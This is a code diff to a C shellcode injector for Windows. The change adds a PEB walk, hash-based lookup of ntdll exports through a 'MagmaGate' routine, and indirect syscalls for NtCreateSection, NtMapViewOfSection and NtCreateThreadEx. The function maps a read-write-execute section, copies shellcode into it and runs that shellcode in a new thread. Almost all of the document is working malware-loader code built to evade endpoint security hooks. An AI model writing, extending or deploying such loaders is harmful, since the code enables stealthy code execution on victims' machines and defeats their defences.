@@ -1,4 +1,5 @@
 #include "local_map.h"
+#include "box.h"
 
 VOID IDSC
 (
@@ -49,26 +50,53 @@ BOOL local_map_inject
 	HMODULE ntdll = NULL;
 	NTSTATUS STATUS = NULL;
 	PVOID localaddress = NULL;
+	PIMAGE_EXPORT_DIRECTORY pImgDir = NULL;
+	SYSCALL_INFO info = { 0 };
+	INSTRUCTIONS_INFO syscallInfos[3] = { 0 };
 
-
-	ntdll = GetModuleHandleW(L"ntdll.dll");
-	if (ntdll == NULL)
+	ntdll = WalkPeb();
+	if (!ntdll)
 	{
-		WARN("Could not retrive NTDLL! Reason: %lu", GetLastError);
-		return FALSE;
+		PRINT_ERROR("WalkPeb");
+		return 1;
 	}
 
 	OKAY("[0x%p] Got a handle to NTDLL!", ntdll);
 
-	// Calling out Functions via IS
+	if (!GetEAT(ntdll, &pImgDir))
+	{
+		PRINT_ERROR("GetEAT");
+		return 1;
+	}
 
-	IDSC(ntdll, "NtCreateSection", &fn_NtCreateSectionSSN, &fn_NtCreateSectionSyscall);
-	IDSC(ntdll, "NtMapViewOfSection", &fn_NtMapViewOfSectionSSN, &fn_NtMapViewOfSectionSyscall);
-	IDSC(ntdll, "NtCreateThreadEx", &fn_NtCreateThreadExSSN, &fn_NtCreateThreadExSyscall);
+	const CHAR* Functions[] =
+	{
+		"NtCreateSection",
+		"NtMapViewOfSection",
+		"NtCreateThreadEx"
+	};
+
+	size_t FuncSize = ARRAYSIZE(Functions);
+
+	for (size_t i = 0; i < FuncSize; i++)
+	{
+		DWORD apiHash = GetBaseHash(
+			Functions[i],
+			ntdll,
+			pImgDir
+		);
+
+		MagmaGate(pImgDir, ntdll, apiHash, &info);
+
+		syscallInfos[i].SSN = info.SSN;
+		syscallInfos[i].SyscallInstruction = info.SyscallInstruction;
+	}
 
 	/*--------------------------------------------------------[Creating a Section in Our Process]-----------------------------------------------------------*/
 
-	STATUS = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
+	SetConfig(syscallInfos[0].SSN, syscallInfos[0].SyscallInstruction); // NtCreateSection
+	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, PLARGE_INTEGER, ULONG, ULONG, HANDLE))SyscallInvoker)
+		(&hSection, SECTION_ALL_ACCESS, NULL, &maxSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);
 	if (STATUS != STATUS_SUCCESS)
 	{
 		WARN("Error! Could not Create a Section via Indirect Syscalls! Reason: 0x%0.8x", STATUS);
@@ -80,7 +108,9 @@ BOOL local_map_inject
 
 	/*-----------------------------------------------------------------------[Mapping Our Section]--------------------------------------------------------------------------*/
 
-	STATUS = NtMapViewOfSection(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
+	SetConfig(syscallInfos[1].SSN, syscallInfos[1].SyscallInstruction); // NtMapViewOfSection
+	STATUS = ((NTSTATUS(*)(HANDLE, HANDLE, PVOID, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, SECTION_INHERIT, ULONG, ULONG))SyscallInvoker)
+		(hSection, NtCurrentProcess(), &localaddress, NULL, NULL, NULL, &size, 2, 0, PAGE_EXECUTE_READWRITE);
 	if (STATUS != STATUS_SUCCESS)
 	{
 		WARN("Error! Could not Map the Section! Reason: 0x%0.8x", STATUS);
@@ -96,7 +126,9 @@ BOOL local_map_inject
 
 	OKAY("Copied %zu Bytes into Local Section Address!", sShellSize);
 
-	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, localaddress, NULL, FALSE, 0, 0, 0, NULL);
+	SetConfig(syscallInfos[2].SSN, syscallInfos[2].SyscallInstruction); // NtCreateThreadEx
+	STATUS = ((NTSTATUS(*)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, HANDLE, PVOID, PVOID, ULONG, SIZE_T, SIZE_T, SIZE_T, PPS_ATTRIBUTE_LIST))SyscallInvoker)
+		(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, localaddress, NULL, FALSE, 0, 0, 0, NULL);
 	if (STATUS != STATUS_SUCCESS)
 	{
 		WARN("NtCreateThreadEx Failed to Create a New Thread! Reason: 0x%0.8x", STATUS);
